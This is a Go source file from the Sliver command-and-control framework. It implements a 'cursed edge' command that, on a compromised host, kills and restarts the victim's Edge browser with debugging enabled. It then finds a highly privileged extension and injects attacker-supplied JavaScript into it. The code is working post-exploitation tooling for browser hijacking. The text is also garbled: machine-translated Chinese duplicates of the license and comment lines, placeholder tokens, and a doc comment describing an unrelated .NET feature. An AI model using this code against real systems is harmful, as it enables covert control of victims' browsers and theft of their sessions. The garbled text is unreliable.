package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox
	Copyright (C) 2022 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"context"
	"os"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/forms"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
)

// CursedChromeCmd - Execute a .NET assembly in-memory.
// CursedChromeCmd - Execute 一个 .NET 组件 in__PH0__.
func CursedEdgeCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	payloadPath, _ := cmd.Flags().GetString("payload")
	var payload []byte
	var err error
	if payloadPath != "" {
		payload, err = os.ReadFile(payloadPath)
		if err != nil {
			con.PrintErrorf("Could not read payload file: %s\n", err)
			return
		}
	}

	curse := avadaKedavraEdge(session, cmd, con, args)
	if curse == nil {
		return
	}
	if payloadPath == "" {
		con.PrintWarnf("No Cursed Edge payload was specified, skipping payload injection.\n")
		return
	}

	con.PrintInfof("Searching for Edge extension with all permissions ... ")
	chromeExt, err := overlord.FindExtensionWithPermissions(curse, cursedChromePermissions)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	// There is one alternative set of permissions that we can use if we don't find an extension
	// There 是一组替代权限，如果我们找不到扩展名，我们可以使用它
	// with all the proper permissions.
	// 具有所有正确的 permissions.
	if chromeExt == nil {
		chromeExt, err = overlord.FindExtensionWithPermissions(curse, cursedChromePermissionsAlt)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	if chromeExt != nil {
		con.Printf("success!\n")
		con.PrintInfof("Found viable Edge extension %s (%s)\n", console.StyleBold.Render(chromeExt.Title), chromeExt.ID)
		con.PrintInfof("Injecting payload ... ")
		cmd, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
		// extCtxTimeout, cancel := context.WithTimeout(cmd, 10*time.Second)
		// extCtxTimeout，取消 := context.WithTimeout(cmd，10*time.Second)
		// defer cancel()
		// 推迟取消()
		_, err = overlord.ExecuteJS(cmd, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		con.Printf("success!\n")
	} else {
		con.Printf("failure!\n")
		con.PrintInfof("No viable Edge extensions were found ☹️\n")
	}
}

func avadaKedavraEdge(session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient, cargs []string) *core.CursedProcess {
	edgeProcess, err := getEdgeProcess(session, cmd, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	if edgeProcess != nil {
		con.PrintWarnf("Found running Edge process: %d (ppid: %d)\n", edgeProcess.GetPid(), edgeProcess.GetPpid())
		con.PrintWarnf("Sliver will need to kill and restart the Edge process in order to perform code injection.\n")
		con.PrintWarnf("Sliver will attempt to restore the user's session, however %s\n", console.StyleBold.Render("DATA LOSS MAY OCCUR!"))
		con.Printf("\n")
		confirm := false
		err = forms.Confirm("Kill and restore existing Edge process?", &confirm)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if !confirm {
			con.PrintErrorf("User cancel\n")
			return nil
		}
		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
			Request: con.ActiveTarget.Request(cmd),
			Pid:     edgeProcess.GetPid(),
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if terminateResp.Response != nil && terminateResp.Response.Err != "" {
			con.PrintErrorf("could not terminate the existing process: %s\n", terminateResp.Response.Err)
			return nil
		}
	}
	curse, err := startCursedChromeProcess(true, session, cmd, con, cargs)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	return curse
}

func isEdgeProcess(executable string) bool {
	edgeProcessNames := []string{
		"msedge",         // Linux
		"microsoft-edge", // Linux
		"msedge.exe",     // Windows
		"Microsoft Edge", // Darwin
	}
	for _, suffix := range edgeProcessNames {
		if strings.HasSuffix(executable, suffix) {
			return true
		}
	}
	return false
}

func getEdgeProcess(session *clientpb.Session, cmd *cobra.Command, con *console.SliverClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: con.ActiveTarget.Request(cmd),
	})
	if err != nil {
		return nil, err
	}
	for _, process := range ps.Processes {
		if process.GetOwner() != session.GetUsername() {
			continue
		}
		if isEdgeProcess(process.GetExecutable()) {
			return process, nil
		}
	}
	return nil, nil
}
